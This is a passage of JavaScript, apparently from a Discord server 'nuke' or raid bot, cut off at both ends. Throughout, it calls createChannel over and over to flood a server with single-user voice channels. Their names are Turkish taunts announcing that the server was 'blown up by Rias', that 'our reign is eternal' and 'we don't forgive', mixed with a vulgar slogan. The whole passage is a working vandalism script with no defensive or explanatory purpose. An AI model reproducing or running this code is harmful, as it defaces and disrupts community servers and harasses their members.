      .createChannel("PATLATILMIŞTIR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });

    await msg.guild
      .createChannel("Rîas", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("TARAFINDAN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });

    await msg.guild
      .createChannel("Rias", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("TARAFINDAN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });

    await msg.guild
      .createChannel("Rias", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("TARAFINDAN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });

    await msg.guild
      .createChannel("Rîas", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("TARAFINDAN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });

    await msg.guild
      .createChannel("Rias", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("TARAFINDAN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });

    await msg.guild
      .createChannel("Rîas", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("TARAFINDAN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });

    await msg.guild
      .createChannel("Rîas", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("TARAFINDAN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });

    await msg.guild
      .createChannel("Rîas", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("TARAFINDAN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });

    await msg.guild
      .createChannel("Rîas", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("TARAFINDAN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });

    await msg.guild
      .createChannel("Rîas", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("TARAFINDAN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });

    await msg.guild
      .createChannel("Rîas", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("TARAFINDAN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias  Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });

    await msg.guild
      .createChannel("Rîas", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("TARAFINDAN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });

    await msg.guild
      .createChannel("Rîas", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("TARAFINDAN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });

    await msg.guild
      .createChannel("Rîas", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("TARAFINDAN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });

    await msg.guild
      .createChannel("Rîas", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("TARAFINDAN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });

    await msg.guild
      .createChannel("Rîas", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("TARAFINDAN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });

    await msg.guild
      .createChannel("Rias", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("TARAFINDAN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });

    await msg.guild
      .createChannel("Rîas", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("TARAFINDAN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });

    await msg.guild
      .createChannel("Rîas", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("TARAFINDAN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
